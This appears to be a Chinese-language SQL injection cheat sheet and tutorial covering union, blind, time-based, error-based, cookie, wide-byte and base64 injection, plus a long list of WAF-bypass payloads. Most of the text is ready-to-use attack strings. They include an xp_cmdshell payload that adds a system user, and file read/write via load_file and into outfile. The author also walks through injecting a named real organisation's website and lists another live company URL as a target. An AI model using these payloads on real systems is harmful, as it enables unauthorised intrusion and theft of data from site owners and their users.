# SQL注入总结 #
#### 漏洞由来 ####
后端处理程序查询数据库或写入数据库时没有做好对应的过滤措施
导致被查询的语句带有注入语句，引发的SQL注入

#### 漏洞危害 ####
危险等级：高
说明：攻击者可从注入点获取敏感数据，若是数据库用户权限高还能getshell，甚至提权

#### 常见的数据库 ####
1.MYSQL
2.MSSQL
3.POSTSQL
4.NOSQL

#### 注入的分类 ####
1.普通类型注入
2.盲注
3.延时注入
4.报错注入
5.堆叠注入
6.POST注入
7.宽字节注入
8.cookie注入
9.Referer注入
10.headers注入
11.闭合注入
12.base64注入

#### 注入的过程 ####
普通注入的过程：
1.判断是否存在注入
2.跑位置
3.通过位置获取数据库名或用户名，数据库版本号等
4.查询表名
5.查询字段名
6.获取数据

盲注的过程：
1.判断是否有注入
2.跑数据库长度
3.猜解数据库名称
4.猜解表的个数
5.猜解表的长度
6.猜解表名
7.猜解字段个数
8.猜解字段长度
9.猜解字段名
10.猜解数据个数
11.猜解数据长度
12.猜解数据

#### 注入的适用 ####
普通注入适合用于可以正确回显并且可以正常获取出数据
盲注适合用于可以正确回显获取不了数据
延时注入适用于无法正确回显
报错注入适用于可以输出数据库报错
POST注入一般出现在用于表单提交到后端带入数据库查询
宽字节注入由于页面编码为GBK编码导致注入时可以绕过过滤

#### 判断是否有注入 ####
and 1=1 页面返回正常
and 1=2 页面返回错误


####  常见的查询语句 ####
这里我上fofas.so找了一个sqli-labs平台，大家可以自行测试
[SQL Injections](http://35.201.152.114:8000/)

普通注入语句：
```sql
and 1=1 页面返回正常
and 1=2 页面返回错误
order by x 跑位置，直到报错的前一个
and 1=2 union select 1,2,3 获取位置，这里的1,2,3是上一步跑出来的
and 1=2 union select 1,database(),3 获取数据库名称
and 1=2 union select 1,user(),3 获取数据库用户名称
and 1=2 union select 1,version(),3 获取数据库版本
and 1=2 union select 1,group_count(table_name),3 from information_schmea.tables where table_schema=0x7365637572697479 获取表名，这里0x7365637572697479是数据库表名的hex编码,group count获取全部的意思
and 1=2 union select 1,group_count(column_name),3 from information_schema.columns where table_name=0x7573657273 获取字段名称
and 1=2 union select 1,username,3 from users 获取数据
```

盲注语句：
```sql
and(length(database())=8) 猜解数据库长度，页面错误的前一个即是长度
and(left(database(),8)="security") 猜解数据库名称
and(1=(select count(table_name) from information_schema.tables where table_schema="security")) 猜解表的个数，直到页面正确为止
and ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1)) 猜解表名的长度，直到页面返回错误的前一个
and ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))=105 猜解表名，105是ascii码
and(1=(select count(column_name) from information_schmea.columns where table_name="users")) 猜解字段的个数
and ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1)) 猜解字段长度
and ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1))=98 猜解字段名称
and(1=(select count(username) from users)) 猜解数据个数
and ascii(substr((select username from users limit 0,1),1,1)) 猜解数据长度
and ascii(substr((select username from users limit 0,1),1,1))=150 猜解数据
```

延时注入语句
```sql
and sleep(if((length(database())=8),1,4)) 猜解数据库长度，若是长度正确浏览器请求1秒
and sleep(if((left(database(),8)="security"),1,4))猜解数据库名称
and sleep(if((1=(select count(table_name) from information_schema.tables where table_schema="security")),1,4)) 猜解表的个数
and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))),1,4)) 猜解表的长度
and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))=105),1,4)) 猜解表名
and sleep(if((1=(select count(column_name) from information_schmea.columns where table_name="users")),1,4)) 猜解字段个数
and sleep(if((ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1))),1,4)) 猜解字段长度
and sleep(if((ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1))=98),1,4)) 猜解字段名
and sleep(if((1=(select count(username) from users)),1,4)) 猜解数据长度
and sleep(if((ascii(substr((select username from users limit 0,1),1,1))),1,4)) 猜解数个数
and sleep(if((ascii(substr((select username from users limit 0,1),1,1))=150),1,4)) 猜解数据
```

堆叠注入语句
```
公式：;select if((盲注语句),sleep(1),sleep(4))
```

报错注入语句
```
and updatexml(1,concat(0x7e,(select user()),0x7e),1) select user()改为自己的注入语句
```

POST注入就是请求的方式不同

宽字节注入
说明：由于数据库编码为GBK利用GBK编码构造特殊字符绕过过滤
过滤代码：
```php
<?php
$conn=mysql_connect('127.0.0.1','root','root') or die('bad!');
mysql_select_db('security',$conn);
mysql_query("SET NAMES 'gbk'",$conn);
$id=addslashes($_GET['id']);
$sql="SELECT * FROM users WHEN id='$id' LIMIT 0,1";
echo $sql."<br>";
$result=mysql_query($sql,$conn) or die(mysql_error());
$row=mysql_fetch_array($result);
if($row){
    echo $row['username'].":".$row['address'];
}else{
    print_r(mysql_error());
}

?>
```
<?php
$conn=mysql_connect('127.0.0.1','root','root') or die('bad!');
mysql_select_db('security',$conn);
mysql_query("SET NAMES 'gbk'",$conn);
$id=addslashes($_GET['id']);
$sql="SELECT * FROM users WHEN id='$id' LIMIT 0,1";
echo $sql."<br>";
$result=mysql_query($sql,$conn) or die(mysql_error());
$row=mysql_fetch_array($result);
if($row){
    echo $row['username'].":".$row['address'];
}else{
    print_r(mysql_error());
}

?>


```
%df '
%df and 1=1
%df and 1=2
```
结果如下：
![k1UQMt.png](https://s2.ax1x.com/2019/01/31/k1UQMt.png)

cookie注入
将网获取到的cookie写入数据库，但是没做好过滤措施导致注入
```
这里的注入拿sqli-labs第20关来说明：

以下是sqli-labs/Less/20关的代码：

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>Less-20 Cookie Injection- Error Based- string</title>
</head>

<body bgcolor="#000000">
<?php
//including the Mysql connect parameters.
	include("../sql-connections/sql-connect.php"); /*包含该php文件*/
	error_reporting(0);
if(!isset($_COOKIE['uname'])) /*如果变量不存在则执行*/
	{
	//including the Mysql connect parameters.
	include("../sql-connections/sql-connect.php");

	echo "<div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'> Welcome&nbsp;&nbsp;&nbsp;<font color='#FF0000'> Dhakkan </font><br></div>";
	echo "<div  align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'>";
	echo "<div style='padding-top:10px; font-size:15px;'>";
 

	echo "<!--Form to post the contents -->";
	echo '<form action=" " name="form1" method="post">';

	echo ' <div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;';
	echo '   <input type="text"  name="uname" value=""/>  </div>';
  
	echo ' <div> Password : &nbsp; &nbsp; &nbsp;';
	echo '   <input type="text" name="passwd" value=""/></div></br>';	
	echo '   <div style=" margin-top:9px;margin-left:90px;"><input type="submit" name="submit" value="Submit" /></div>';

	echo '</form>';
	echo '</div>';
	echo '</div>';
	echo '<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">';
	echo '<font size="3" color="#FFFF00">';
	echo '<center><br><br><br>';
	echo '<img src="../images/Less-20.jpg" />';
	echo '</center>';




	
function check_input($value)
	{
	if(!empty($value)) /*如果变量不为空*/
		{
		$value = substr($value,0,20); // truncation (see comments) /*从0的位置开始读取，长度为20*/
		}
		if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled /*开启magic_quotes*/
			{
			$value = stripslashes($value); /*反引用一个引用字符串*/
			}
		if (!ctype_digit($value))   	// Quote if not a number /*纯数字检查*/
			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
	else
		{
		$value = intval($value); /*取整数*/
		}
	return $value;
	}


	
	echo "<br>";
	echo "<br>";
	
	if(isset($_POST['uname']) && isset($_POST['passwd'])) /*判断uname和passwd是否存在*/
		{
	
		$uname = check_input($_POST['uname']); /*调用check_input过滤变量*/
		$passwd = check_input($_POST['passwd']);
		
	

		
		$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
		$result1 = mysql_query($sql); /*查询数据库*/
		$row1 = mysql_fetch_array($result1);
		$cookee = $row1['username'];
			if($row1)
				{
				echo '<font color= "#FFFF00" font size = 3 >';
				setcookie('uname', $cookee, time()+3600);	
				header ('Location: index.php');
				echo "I LOVE YOU COOKIES";
				echo "</font>";
				echo '<font color= "#0000ff" font size = 3 >';			
				//echo 'Your Cookie is: ' .$cookee;
				echo "</font>";
				echo "<br>";
				print_r(mysql_error());			
				echo "<br><br>";
				echo '<img src="../images/flag.jpg" />';
				echo "<br>";
				}
			else
				{
				echo '<font color= "#0000ff" font size="3">';
				//echo "Try again looser";
				print_r(mysql_error());
				echo "</br>";			
				echo "</br>";
				echo '<img src="../images/slap.jpg" />';	
				echo "</font>";  
				}
			}
		
			echo "</font>";  
	echo '</font>';
	echo '</div>';

}
else
{



	if(!isset($_POST['submit'])) /*如果submit不存在*/
		{
			
			$cookee = $_COOKIE['uname'];
			$format = 'D d M Y - H:i:s';
			$timestamp = time() + 3600;
			echo "<center>";
			echo '<br><br><br>';
			echo '<img src="../images/Less-20.jpg" />';
			echo "<br><br><b>";
			echo '<br><font color= "red" font size="4">';	
			echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];
			echo "</font><br>";	
			echo '<font color= "cyan" font size="4">';	
			echo "YOUR IP ADDRESS IS : ".$_SERVER['REMOTE_ADDR'];			
			echo "</font><br>";			
			echo '<font color= "#FFFF00" font size = 4 >';
			echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br>";
			echo '<font color= "orange" font size = 5 >';			
			echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
			
			
			echo "<br></font>";
			$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
			$result=mysql_query($sql);
			if (!$result)
  				{
  				die('Issue with your mysql: ' . mysql_error());
  				}
			$row = mysql_fetch_array($result);
			if($row)
				{
			  	echo '<font color= "pink" font size="5">';	
			  	echo 'Your Login name:'. $row['username'];
			  	echo "<br>";
				echo '<font color= "grey" font size="5">';  	
				echo 'Your Password:' .$row['password'];
			  	echo "</font></b>";
				echo "<br>";
				echo 'Your ID:' .$row['id'];
			  	}
			else	
				{
				echo "<center>";
				echo '<br><br><br>';
				echo '<img src="../images/slap1.jpg" />';
				echo "<br><br><b>";
				//echo '<img src="../images/Less-20.jpg" />';
				}
			echo '<center>';
			echo '<form action="" method="post">';
			echo '<input  type="submit" name="submit" value="Delete Your Cookie!" />';
			echo '</form>';
			echo '</center>';
		}	
	else
		{
		echo '<center>';
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo "<br>";
		echo '<font color= "#FFFF00" font size = 6 >';
		echo " Your Cookie is deleted";
				setcookie('uname', $row1['username'], time()-3600);
				header ('Location: index.php');
		echo '</font></center></br>';
		
		}		


			echo "<br>";
			echo "<br>";
			//header ('Location: main.php');
			echo "<br>";
			echo "<br>";
			
			//echo '<img src="../images/slap.jpg" /></center>';
			//logging the connection parameters to a file for analysis.	
		$fp=fopen('result.txt','a');
		fwrite($fp,'Cookie:'.$cookee."\n");
	
		fclose($fp);
	
}
?>

</body>
</html>

对username和password进行了严格的过滤和去除了反斜杆几乎不存在注入
但是带入cookie进行查询的时候没有做好对应的过滤措施，导致SQL注入的发送

POST /Less-20/index.php HTTP/1.1
Host: 118.24.125.87:8000
Content-Length: 0
Cache-Control: max-age=0
Origin: http://118.24.125.87:8000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://118.24.125.87:8000/Less-20/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie:  uname=admin' and updatexml(1,concat(0x7e,(select user()),0x7e),1) and '1'='1
Connection: close

返回：

HTTP/1.1 200 OK
Date: Thu, 17 Jan 2019 05:37:48 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.13
Vary: Accept-Encoding
Content-Length: 1028
Connection: close
Content-Type: text/html

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>Less-20 Cookie Injection- Error Based- string</title>
</head>

<body bgcolor="#000000">





 
<center><br><br><br><img src="../images/Less-20.jpg" /><br><br><b><br><font color= "red" font size="4">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</font><br><font color= "cyan" font size="4">YOUR IP ADDRESS IS : 113.77.238.53</font><br><font color= "#FFFF00" font size = 4 >DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br><font color= "orange" font size = 5 >YOUR COOKIE : uname = admin' and updatexml(1,concat(0x7e,(select user()),0x7e),1) and '1'='1 and expires: Thu 17 Jan 2019 - 06:37:48<br></font>Issue with your mysql: XPATH syntax error: '~root@localhost~'

```
Referer和headers头部注入也是类似于cookie注入的原因而导致的注入，这里就略过不说了



闭合注入
如果注入点类似于在
```
select * from user where username='username'
```
那么就要对注入语句进行闭合
常见的闭合
注意 
```
这里的%7c为|
```
|SQL查询语句|闭合注入语句|
|--------------|---------------|
|select * from users where username='$u';|' and 1=2 # 或 ' and 1=2 and '1'='1 或 and 1=2 %7c'1
|select * from users where usersname="$U";|"and 1=2 --+ 或 " and 1=2 and "1"="1 或 and 1=2 %7c"1
|select * from users where username=("$u");|") and 1=2 --+ 或 ") and 1=2 and ("1")=("1 或 and 1=2 %7c("1

base64注入

将变量进行了base64编码，到后端处理代码在进行base64解码然后在带入数据库中查询

实例：

[斗湖中华商会](http://www.ccctawau.org/eventinfo.php?id=MTM=)
```
仅供测试使用，若是想蹲监与作者无关
```

![k1akSs.md.png](https://s2.ax1x.com/2019/01/31/k1akSs.md.png)

```
http://www.ccctawau.org/eventinfo.php?id=MTM=
```
明显的base64加密，解密看看？
![k1amwT.png](https://s2.ax1x.com/2019/01/31/k1amwT.png)

尝试注入
![k1aMY4.png](https://s2.ax1x.com/2019/01/31/k1aMY4.png)


and 1=2返回了错误
![k1a1p9.md.png](https://s2.ax1x.com/2019/01/31/k1a1p9.md.png)

and 1=1返回了正常
![k1a3lR.png](https://s2.ax1x.com/2019/01/31/k1a3lR.png)

注入带走
![k1awfH.md.png](https://s2.ax1x.com/2019/01/31/k1awfH.md.png)

#### 绕过过滤注入 ####
```
1.先判断他过滤了什么
2.能否通过切割关键字绕过
3.能否通过代替关键字绕过
```

注入常遇见的WAF：
```
WTS-WAF
安全狗
D盾
云锁
```

前两种比较好绕过，后面两种本人没成功过= =

常见的绕过语句：
```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
对参数名进行url编码
http://127.0.0.1/sql.php?%69d=1
对参数值进行url编码
http://127.0.0.1/sql.php?id=1%20%61%6E%64%20%31%3D%32
对参数值进行双重编码
http://127.0.0.1/sql.php?id=1%25%32%30%25%36%31%25%36%45%25%36%34%25%32%30%25%33%31%25%33%44%25%33%32
单引号的一些编码：
%u0027
%u02b9
%u02bc
%u02c8
%u2032
%uff07
%c0%27
%c0%a7
%e0%80%a7
星号的一些编码：
%u002a
%uff0a
%c0%2a
%c0%aa
%e0%80%aa
使用 Mysql 内置函数 char（）。示例代码:
char(114)='r'
1.3 使用 Mysql 内置函数 HEX（）,UNHEX(). ,UNHEX(). ,UNHEX(). ,UNHEX().示例代码：
通过 str 获取 hex 值:
select hex("root") 返回结果:726F6F74
通过 hex 获取 str:
select unhex( "726F6F74" ) 返回结果: root
比如:当关键字 root 被过滤时可以用 0x726F6F74 代替 root
base64变形注入，通过base64编码引发的注入
http://127.0.0.1/sql.php?id=1
http://127.0.0.1/sql.php?id=MSBhbmQgMT0y
判断注入点的姿势
id=1+OR+0x50=0x50
id=1+and+5!=6
And 0 (false)
And 1 (true)
And (true)
And (false)
'/*!or*/1='1
or 1=1;%00
and 1=1
&&2=2
or 3=3
Xor 4=4
Xor 5 LIKE 5
or 6 rLiKE 6
|| 3>2
&& 3<7
AnD is null
AnD is not null
and '0having'='0having'
and 1='1

替换空格
/**/
+
%20
'%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F',
'%0A'
--%0A
%23%0A
%23PTTmJopxdWJ%0A
%23cWfcVRPV%0A
‘or+(1)sounds/**/like“1“–%a0-
‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#
(0)union(select(table_name),column_name,…
0%a0union%a0select%09group_concat(table_name)….
?id=(case(substr((select(group_concat(table_name))from(information_schema.tables)),1,1))when(
0x61)then(1)else(2)end)
?id=(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((tab
le_name)like(0x7573657273)))#
?id=if((select(count(*))from(information_schema.columns))=187,1,2)
用过多个空格替换" "=>" "
用%bf%27 代替单引号
PostgreSQL 可以用$$代替单引号来突破防注入
可以达到相似目的的 Mysql 函数
substring() mid() substr()
ascii() hex() bin() ord()
benchmark() sleep()

没有where如何注入：
源语句：select user from users where user="admin";
没有where语句：select user from users group by user having user="admin";
没有union：
and (select passfrom userslimit 1)=’secret
And exists (select * fromuser limit 1)=’admin
没有limit
 select pass from users where 1
 没有group
 select substr(user,1) from users //直接爆出全部内容
 select substr(user,1,1) from users //爆出全部的第一个字符 第二个1可以改为你要爆出的字符长度
 select substr(user,1,20) from users
 没有having
 select group_concat(user) from users
 select max(user) from users
 select max(replace(user,'第一个获取到的内容','')) from users; //这个依次替换文字的地方就能获取所有内容
 没有 select
‘ and
substr(load_file(‘file’),locate(‘DocumentRoot’,(load_file(‘file’)))+length(‘DocumentRoot’),10)
=’a
‘=” into outfile ‘/var/www/dump.txt

 没有and
 http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=1),1) //返回正常
 http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=2),1)  //返回错误
 没有 or
1 || substr(user,1,1) = 'a'
1 || substr(user,1,1) = unhex(61)
1 || substr(user,1,1) = lower(conv(11,10,36))
1 || lpad(user,7,1)
1%0b||%0blpad(user,7,1)
突破 preg_replace preg_replace preg_replace preg_replace
http://localhost/sqli.php?id=1+UNunionION+SEselectLECT+1,2,3--
 多参数处理规则：
  web 服务器 | 参数的处理方式 | 例子 |
+--------------------------------------------------------------------------------+
| ASP.NET/IIS | 用逗号隔开 | par1=val1,val2 |
| ASP/IIS | 用逗号隔开 | par1=val1,val2 |
| PHP/Apache | 取最后一个参数的值 | par1=val2 |
| JSP/Tomcat | 取第一个参数的值 | par1=val1 |
| Perl/Apache | 取第一个参数的值 | par1=val1

打碎关键字
使用%打碎关键字
 http://127.0.0.1/sql.php?id=1 u%onion s%e%l%e%c%t 1,2,3
 通过注释符号打碎关键字（不适用于MYSQL>4.1的情况）
 http://127.0.0.1/sql.php?id=1 un/**/ion se/**/lect 1,2,3
 使用%0b打碎关键字
 http://127.0.0.1/sql.php?id=1 un%0bion se%0blect 1,2,3
 使用%0f打碎关键字
 http://127.0.0.1/sql.php?id=1 uni%6fn
 
 更改请求方式
 
cookie注入
示例代码：javascript:alert(documnet.cookie="id"+escpace("51 and 1=1"));
更改method为post

web服务器和WAF对一些字符的处理
+-----------------------------------------------------------+
| | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP |
+-----------------------------------------------------------+
| ?test[1=2 | test_1=2 | test[1=2 |
| ?test=% | test=% | test= |
| ?test%00=1 | test=1 | test=1 |
| ?test=1%001 | NULL | test=1 |
| ?test+d=1+2 | test_d=1 2 | test d=1 2 |
+----------------------------------------------------------------------+
+-------------------------------------------------------------------- --------+
| Keywords | WAF | ASP/ASP.NET |
+-----------------------------------------------------------------------------+
| sele%ct * fr%om.. | sele%ct * fr%om.. | select * from.. |
| ;dr%op ta%ble xxx | ;dr%op ta%ble xxx | ;drop table xxx |
| <scr%ipt> | <scr%ipt> | <script> |
| <if%rame> | <if%rame> | <iframe> |
+-----------------------------------------------------------------------------+

突破安全狗
安全狗本 身对 xx.asp?id=69 and 1=1 和 xx.asp?id=69 and 1=2 这些是过 滤的，可是对
xx.asp?sqli.com=%00.&xw_id=69%20 and 1=1 和 xx.asp?sqli.com=%00.&xw_id=69%20 and
1=2 却是正常，直接丢到工具就 OK 了

缓冲区溢出
突破用 C 语言编写的 WAF
示例代码：
http://localhost/sqli.php?id=1+and+(select 1)=(select
0x414141414141441414141414114141414141414141414141414141
414141414141?.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--

组合攻击
asp 和 asp.net 的 Request 对象存在一个包解析漏洞，Request 对象对于 GET 和 POST 包的解
析过于宽松，用一句话表达就是 Request 对象它 GET 和 POST 傻傻分不清楚，稍有点 web
开发经验的同学应该知道 Request 接收 GET,POST,COOKIE 也就是 GPC 传过来的数据，但
是 asp 和.net 库内置的 Request 对象完全不按 RFC 标准来，下面我们可以做个测试：
我们发送的原始包是：
GET /1.asp HTTP/1.1
Host: 192.168.239.129
Content-Length: 34
Content-Type: application/x-www-form-urlencoded
t=’/**/or/**/1=1–
结果返回如下：
Request:’/**/or/**/1=1–
将 python 测试脚本的 path 改为/1.aspx 测试页返回同样结果。
我们可以看到这是一个畸形的 HTTP GET 请求包，这个包的奥秘在于 t=’/**/or/**/1=1–参数后的 8 个回车换行和 Content-Length 头，包的结构类似于一个 POST 包，而请求的方法是
GET,最后 asp 和 asp.net 的 Request 对象成功的解析了这个畸形包取出了数据。
所以如果 WAF 没有处理好 HTTP 包的内容，沿用常规思路处理 GET 和 POST 的逻辑的话，
那么这个畸形包将会毁掉 WAF 的基础防御。

关键字的大小写转换
SelECt
UnIoN
FroM
UnioN AIL
GrOuP_ConCAt()

/**/为注释
/*!*/执行/*!*/里面的内容

（遇狗可借鉴下面的操作）
对参数值进行污染处理
localhost/sqli.php?id=123 uNiOn All sEleCt/*We are bypassing the WAF*/select/*Rafay Hacking
Artcles*/1,2,3,4,5--
0/**/union/*!50000select*/table_name`foo`/**/…
http://localhost/sqli.aspx?q=select/*&q=*/name&q=password/*&q=*/from/*&q=*/users
http://localhost/sqli.aspx?id=1'; /*&id=1*/ EXEC /*&id=1*/ master..xp_cmdshell
/*&id=1*/ ?net user lucifer UrWaFisShiT? /*&id=1*/ --
/?id=1/*union*/union/*select*/select+1,2,3/*
id=1+union/*&name=*/select+1,2 （存在参数 name）
http://www.f4le.com/member/ajax_membergroup.php?[url=mailto:00.&action=post&membergrou
p=@%60]action=post&membergroup=@`'[/url]` Union select pwd from `%23@__admin` where
1 or id=@`'`
http://www.f4le.com/member/ajax_membergroup.php?0dayf4le.com=%[url=mailto:00.&action=p
ost&membergroup=@`]00.&action=post&membergroup=@`'[/url]` Union select pwd from
`%23@__admin` where 1 or id=@`'`

group_concat()的 1024 chars 的解决方案
select group_concat(substr(user,1,1)) from users; //取从第一个字符到第一个字符
select group_concat(substr(user,1,5)) from users; //取从第一个字符到第五个字符
查询语句写到注释当中
http://127.0.0.1/sql.php? /*!union*/**/*!select 1,user(),database()*/
http://127.0.0.1/sql.php?/*dsadsasdd*/*!and*/*The is by pass*/*!1=2*/
注释符
%23 （#的url编码）[建议养成使用%23的习惯]
-- (后面有个空格所有建议直接使用--+)
/**/
%00(在MS access当中可以当注释符号来用)

突破防注入代码小抄
%00' UNION SELECT password FROM Users WHERE username='admin'--+
IFNULL(1, 2) 可以改写成 IF(ISNULL(1), 2, 1)
0′union all select all`table_name`foo from`information_schema`. `tables
value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNUL
L(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,5
8)), NULL, NULL#/*!0AND 'QDWa'='QDWa
SELECT * FROM users WHERE id LIKE 1
SELECT FIELD%20FROM TABLE 可以写成
%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u004
4%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045
'A> B'可以写成 'ANOT BETWEEN 0 AND B'
1' AND SLEEP(5)# 可以写成 MScgQU5EIFNMRUVQKDUpIw==
AND '1'='1' 可以写成 AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87
load_file/*foo*/(0×616263)
http://localhost/sqli.php?id=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1
%2C2%2Ccurrent_user
http;//127.0.0.1/1.asp?id=(1)anandd(1=1)
试试不要用 /etc/passwd. 用 /foo/../etc/bar/../passwd.
Dumpfile 虽然只能导出一行数据，但必要时还是应该可以拿来和 outfile 换一下的

一些mysql函数
substr(‘abc’,1,1) = ‘a’
substr(‘abc’ from 1 for 1) = ‘a’
substring(‘abc’,1,1) = ‘a’
substring(‘abc’ from 1 for 1) = ‘a’
mid(‘abc’,1,1) = ‘a’
mid(‘abc’ from 1 for 1) = ‘a’
lpad(‘abc’,1,space(1)) = ‘a’
rpad(‘abc’,1,space(1)) = ‘a’
left(‘abc’,1) = ‘a’
reverse(right(reverse(‘abc’),1)) = ‘a’
insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’
space(0) = trim(version()from(version()))
locate(‘a’,'abc’)
position(‘a’,'abc’)
position(‘a’ IN ‘abc’)
instr(‘abc’,'a’)
substring_index(‘ab’,'b’,1)
length(trim(leading ‘a’ FROM ‘abc’))
length(replace(‘abc’, ‘a’, ”))
strcmp(‘a’,'a’)
mod(‘a’,'a’)
find_in_set(‘a’,'a’)
field(‘a’,'a’)
count(concat(‘a’,'a’))
length()
bit_length()
char_length()
octet_length()
bit_count()

姿势大全
新姿势 1:
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
变换姿势: /*mid()函数用于得到字符串的一部分*/
select user from mysql.user where user = 'user' OR mid(password,1,1)='*'  //获取user表中字段的'user'然后输出字段内容里面有个*的
select user from mysql.user where user = 'user' OR mid(password,1,1)=0x2a
select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
select user from mysql.user where user = 'user' OR mid(password,1,1) regexp '[*]'
select user from mysql.user where user = 'user' OR mid(password,1,1) like '*'
select user from mysql.user where user = 'user' OR mid(password,1,1) rlike '[*]'
select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42
select user from mysql.user where user = 'user' OR ascii(mid(password,1,1))=42
select user from mysql.user where user = 'user' OR find_in_set('2a',hex(mid(password,1,1)))=1
select user from mysql.user where user = 'user' OR position(0x2a in password)=1
select user from mysql.user where user = 'user' OR locate(0x2a,password)=1
select user from mysql.user where user = 'user' OR substr(password,1,1)=0x2a
select user from mysql.user where user = 'user' OR substring(password,1,1)=0x2a
新姿势 2:
false !pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 K
true !!pi() 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 L
true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M
floor(pi()) 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 N
ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 O
floor(version()) 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 P
ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q
ceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 R
floor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 S
floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T
```

其他数据库类型注入：
ACCESS注入语句：
```sql
and exists(select * from msysobjects) /*返回错误页面或返回无权限读取代表是Access数据库*/
and exists(select * from admin) /*admin为表名，让你猜表名*/
